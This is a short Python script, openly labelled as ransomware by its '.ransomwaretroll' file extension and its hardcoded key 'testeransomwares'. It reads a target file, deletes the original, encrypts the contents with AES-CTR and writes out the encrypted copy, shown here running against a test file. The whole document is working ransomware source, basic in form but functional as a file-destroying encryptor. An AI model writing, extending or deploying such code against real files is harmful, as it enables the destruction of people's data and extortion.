import os
import pyaes

class FileEncrypter:
    def __init__(self, file_name, key):
        self.file_name = file_name
        self.key = key

    def encrypt_file(self):
        with open(self.file_name, "rb") as file:
            file_data = file.read()

        os.remove(self.file_name)

        aes = pyaes.AESModeOfOperationCTR(self.key)
        crypto_data = aes.encrypt(file_data)

        new_file_name = self.file_name + ".ransomwaretroll"
        with open(new_file_name, "wb") as new_file:
            new_file.write(crypto_data)

if __name__ == "__main__":
    key = b"testeransomwares"
    encrypter = FileEncrypter("teste.txt", key)
    encrypter.encrypt_file()